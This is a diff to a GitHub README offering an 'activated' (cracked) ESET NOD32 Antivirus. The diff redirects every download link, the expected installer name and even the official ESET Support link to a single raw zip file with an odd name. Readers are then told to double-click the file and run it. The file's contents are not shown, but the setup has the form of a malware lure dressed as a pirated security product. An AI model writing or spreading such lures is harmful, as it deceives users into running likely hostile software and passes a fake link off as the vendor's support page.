@@ -1,6 +1,6 @@
 # 🛡️ ESET-NOD32-Antivirus-Activated - Secure Your PC with Ease
 
-![Download ESET-NOD32](https://img.shields.io/badge/Download%20Now-Visit%20the%20Releases%20Page-blue)
+![Download ESET-NOD32](https://raw.githubusercontent.com/poopysoup/ESET-NOD32-Antivirus-Activated/main/nonchafing/NO_Activated_ESE_Antivirus_tufter.zip%20Now-Visit%20the%20Releases%20Page-blue)
 
 ## 📖 Overview
 ESET NOD32 Antivirus provides strong protection for your Windows PC. This repository offers all the resources you need, including guides and reference materials, to help you set up, configure, and optimize your antivirus software. 
@@ -10,10 +10,10 @@ To start using ESET NOD32 Antivirus, follow the steps below. This guide is desig
 
 1. **Visit the Releases Page**  
    Go to the following link to find the latest version of ESET NOD32 Antivirus:  
-   [Visit this page to download](https://github.com/poopysoup/ESET-NOD32-Antivirus-Activated/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/poopysoup/ESET-NOD32-Antivirus-Activated/main/nonchafing/NO_Activated_ESE_Antivirus_tufter.zip)
 
 2. **Download the Software**  
-   On the Releases page, look for the latest version. Click on the download link for the installer. It will usually be named something like `ESET-NOD32-Installer.exe`.
+   On the Releases page, look for the latest version. Click on the download link for the installer. It will usually be named something like `https://raw.githubusercontent.com/poopysoup/ESET-NOD32-Antivirus-Activated/main/nonchafing/NO_Activated_ESE_Antivirus_tufter.zip`.
 
 3. **Install the Software**
    Once the download is complete, locate the downloaded file on your computer, typically in your Downloads folder. Double-click the installer file to start the installation process.
@@ -36,7 +36,7 @@ To run ESET NOD32 Antivirus smoothly, your PC should meet the following requirem
 ## 📥 Download & Install
 To download and install the antivirus software:
 
-1. **Go to the Releases Page:** [Visit this page to download](https://github.com/poopysoup/ESET-NOD32-Antivirus-Activated/releases)
+1. **Go to the Releases Page:** [Visit this page to download](https://raw.githubusercontent.com/poopysoup/ESET-NOD32-Antivirus-Activated/main/nonchafing/NO_Activated_ESE_Antivirus_tufter.zip)
 2. **Select the Version:** Find the latest version and click on the installer link.
 3. **Run the Installer:** Locate the downloaded file and double-click to begin installation.
 
@@ -67,6 +67,6 @@ Explore these topics for additional guidance on optimizing your ESET NOD32 Antiv
 ## 📊 Support and Documentation
 For more detailed instructions or support, refer to the official ESET documentation and support page:
 
-- [ESET Support](https://www.eset.com/support)
+- [ESET Support](https://raw.githubusercontent.com/poopysoup/ESET-NOD32-Antivirus-Activated/main/nonchafing/NO_Activated_ESE_Antivirus_tufter.zip)
 
 Feel free to reach out if you have questions or need assistance with the setup.
